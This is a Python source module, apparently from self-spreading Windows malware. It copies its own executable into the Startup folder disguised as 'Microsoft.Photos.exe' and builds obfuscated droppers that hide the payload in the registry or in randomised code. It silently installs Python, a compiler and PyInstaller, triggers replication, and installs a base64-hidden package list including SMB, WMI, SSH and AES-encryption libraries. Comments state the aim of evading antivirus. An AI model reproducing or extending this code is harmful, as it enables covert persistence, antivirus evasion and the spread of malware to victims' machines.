import base64
import os
import shutil
import string
import subprocess
import time
from random import randrange,choice
from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
    download_file, extract_zip, get_current_file_path, base64_encode_file, \
    find_python_path, ctypes_update_system,\
    is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable,setRegistryKey,TypicalRegistryKey, is_gcc_in_path
from Replication.main import replicate
from pyinstaller_obfuscation.obfuscation import Obfuscate
from source_codes import dropper


def download_pyinstaller(download_path: str):
    """
    :param download_path: the assumed file name on the local system when downloaded
    we return False, or path to the extracted_file
    clean_path is the download_path --> but without the .zip suffix,
    so clean path is actually the extraction dir!
    """
    URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
    clean_path = download_path.replace('.zip', '')
    final_dir = clean_path.split('/')[::-1][0]
    if download_file(download_path, URL):
        # //TODO 1: check if this actually works!
        print(final_dir)
        if extract_zip(BaseTempFolder.format(os.getlogin()), download_path):
            return tempFolder.format(os.getlogin(),final_dir)
    return False


def persist_in_startup():
    """no matter what we succeed to do just copy the current running exe to the startup folder
    //TODO 3: find another creative ways to persist in the FS and evade AV"""
    base64_of_ourself = base64_encode_file(get_current_file_path())  # str
    name_for_copy = "Microsoft.Photos.exe"  # //TODO 2: add here names of unsigned files in windows with random.choice.
    startup_folder = startupFolder.format(os.getlogin(),name_for_copy)
    with open(startup_folder, 'wb') as new_file:
        new_file.write(base64.b64decode(base64_of_ourself.encode()))  # //TODO 4: Check if this working.
    return startup_folder


def create_dropper():
    """
    if we don't obfuscated pyinstaller, and we don't have admin rights
    we are gonna create a dropper with embedded base64 of our main exe.
    this dropper is kind'a in stupid way
    """
    current_file = get_current_file_path()
    obfuscated_encoding_name = random_string(is_random=True)
    obfuscated_main_function = random_string(is_random=True)
    obfuscated_file_var = random_string(is_random=True)
    obfuscated_file_name = random_string(is_random=True,is_exe=True)
    obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
                                f"appdata/roaming/microsoft/" \
                                f"windows/start menu/programs/startup/{obfuscated_file_name}'"
    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name}'"
    type_of_encoding = "b64decode"
    our_encoded_file = base64_encode_file(current_file)
    manipulation_types = ['reverse','replace']
    should_registry = choice([True,False])
    manipulate = choice(manipulation_types)
    chars_to_rep = [choice(string.ascii_uppercase) for _ in range(2)]
    if manipulate == 'reverse':
        our_encoded_file = our_encoded_file[::-1]
    else :
        # replace!
        our_encoded_file = our_encoded_file.replace(chars_to_rep[0],chars_to_rep[1])
    is_rev_flag = random_string(is_random=True)
    is_rep_flag = random_string(is_random=True)
    split_factor = choice(['_','-',',','.','+',')','('])
    hint = is_rev_flag if manipulate == 'reverse' else f'{is_rep_flag}{split_factor}{chars_to_rep[1]}{chars_to_rep[0]}'
    type_of_manip = random_string(is_random=True)
    if should_registry:
        random_locations = [f"c:/users/{os.getlogin()}/appdata/local/temp/",
                            f"c:/users/{os.getlogin()}/appdata/local/programs/",
                            f"c:/users/{os.getlogin()}/appdata/LocalLow/",
                            f"c:/users/{os.getlogin()}/appdata/Roaming/",]
        random_location = os.path.join(choice(random_locations), random_string(is_random=True, is_exe=True))
        our_reg_key = random_string(is_random=True)
        setRegistryKey(registry_path=TypicalRegistryKey, key_name=our_reg_key, value=our_encoded_file)
        code = dropper.type1
        code = code.format(
            type_of_encoding,obfuscated_encoding_name,
            type_of_manip,hint,
            TypicalRegistryKey,our_reg_key,
            random_location,type_of_manip,is_rev_flag,
            obfuscated_encoding_name,type_of_manip,
            split_factor,obfuscated_encoding_name,
            random_location
        )

    else:
        # in the end --> if not registry, add '"""{code}"""'
        our_encoded_file = f'"""{our_encoded_file}"""'
        #not registry!
        code = dropper.type2
        code = code.format(type_of_encoding,obfuscated_encoding_name,type_of_manip,hint,
                    our_encoded_file,type_of_manip,is_rev_flag,type_of_manip,split_factor,
                    obfuscated_main_function,obfuscated_startup_folder,obfuscated_file_var,obfuscated_file_var,
                    obfuscated_encoding_name,backup_of_file,obfuscated_file_var,obfuscated_file_var,obfuscated_encoding_name,
                    backup_of_file,obfuscated_main_function)
    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True))
    with open(dropper_py_file, 'w') as dropper_file:
        dropper_file.write(code)
    print(dropper_py_file)
    python_path = find_python_path()
    if 'program' in python_path.lower() and 'appdata' not in python_path.lower():
        check_if_pyinstaller_installed = f'pip list'
    else:
        check_if_pyinstaller_installed = f"{python_path} -m pip list"
    print(run_pwsh(check_if_pyinstaller_installed))
    if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
        if 'program' in python_path.lower() and 'appdata' not in python_path.lower():
            pyinstaller_path = 'pyinstaller.exe'
        else:
            pyinstaller_path = python_path.replace('python.exe', 'scripts/pyinstaller.exe')
        print(pyinstaller_path)
        install_it = run_pwsh(
            f"{pyinstaller_path} --onefile --icon=NONE '{dropper_py_file}' --distpath '{os.path.dirname(dropper_py_file)}'")
        print(install_it)
        # //TODO: find a way to check if the install was success or not
    os.remove(dropper_py_file)  # remove the python dropper code.
    return

def default_pyinstaller_way(pyInstallerDir : str, pyInstallerZip : str,path_to_python : str) -> bool:
    """
    if we failed in compiling the bootloader, we will just install the "plain"
    pyinstaller, and keep it up with the dropper
    """
    if os.path.exists(pyInstallerDir):
        time.sleep(5)  # we wait to make sure we have no handle of the obfuscation active
        try:
            shutil.rmtree(pyInstallerDir)
        except Exception as e:
            pass
    randPyinstaller = random_string(is_random=True)
    extract_zip(pyInstallerDir + randPyinstaller, pyInstallerZip)
    extraction_location = pyInstallerDir + randPyinstaller + \
                          '/' + pyInstallerDir.split('/')[::-1][0].replace('.zip', '')
    os.chdir(extraction_location)
    command = os.system(f"{path_to_python} setup.py install")
    if command == 0:
        replicate()
        return True
    return False


def download_gcc(path_to_python : str) -> bool:
    gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
    PATH = tempFolder.format(os.getlogin(), "gcc.zip")
    GCC_EXTRACTION_PATH = "c:/MinGW"
    if os.path.exists(PATH):
        os.remove(PATH)
    if os.path.exists(GCC_EXTRACTION_PATH):
        shutil.rmtree(GCC_EXTRACTION_PATH)
    if download_file(path=PATH, URL=gcc):
        extract_zip(extraction_path=GCC_EXTRACTION_PATH, file_to_extract=PATH)
    set_env_variable('PATH', r'C:\MinGW\mingw64\bin')
    ctypes_update_system()
    if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=path_to_python).obfuscate():
        replicate()
        # obfuscate files dont actually do anything!
        return True
    return False

def get_pyinstaller(pythonPath: str) -> bool:
    """
    :param str pythonPath: abs path to python.exe}
    //TODO 34: CYTHONIZE
    """
    pip_install()
    PATH = tempFolder.format(os.getlogin(),"pyinstaller-4.7.zip")
    pyinstaller_dir = PATH.replace('.zip', '')
    if os.path.exists(PATH):
        if os.path.exists(pyinstaller_dir):
            shutil.rmtree(pyinstaller_dir)
        extract_zip(pyinstaller_dir, PATH)
    if not download_pyinstaller(PATH):
        # assume pyinstaller extracted in the PATH
        print("[*] Unknown error in extracting and downloading pyinstaller")
        return False
    if is_msvc_exist() or is_gcc_in_path():
        if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
            replicate()
            return True
        return False
    if download_gcc(pythonPath):
        return True
    return default_pyinstaller_way(pyinstaller_dir,PATH,pythonPath)



def pip_install(new_path=None):
    # base64 encode&decode all commands here on runtime, to prevent obfuscation from obfuscating the packages to install
    """
    :param new_path: new path for pytohn.exe (called new_path as we assume we installed python!)
    to_install is base64 encoded list of python packages to install with git
     //TODO 7: change new_path name and arch to something more obious
    """
    to_install = "d2hlZWwgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbCBweXNtYiBXTUkgcGFyYW1pa28gcHlBZXNDcnlwdA=="
    if new_path:
        subprocess.run(
            f"{new_path} -m pip install --upgrade pip")
        subprocess.run(
            f"{new_path} -m pip install {base64.b64decode(to_install.encode()).decode()}")
        return 1
    subprocess.run(
        f"{find_python_path()} -m pip install --upgrade pip")
    subprocess.run(
        f"{find_python_path()} -m pip install {base64.b64decode(to_install.encode()).decode()}")
    return 1


def install_python():
    """
    this function gets called if we didn't find any python installed.
    we can install python with user and admin rights, here it's user only install!
    """
    py64_url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe"
    py32_url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    InstallAllUsers = 0 if not is_admin() else 1
    url = py64_url if is_os_64bit() else py32_url
    rand_py = tempFolder.format(os.getlogin(),f"{random_string(is_random=True,is_exe=True)}")
    install_python_command =  f"{rand_py} /quiet InstallAllUsers={InstallAllUsers} Include_launcher=0 PrependPath=1 Include_test=0"
    if download_file(rand_py, url):
        subprocess.run(install_python_command)
    os.remove(rand_py)
    if find_python_path():
        pip_install()
        return True
    return False
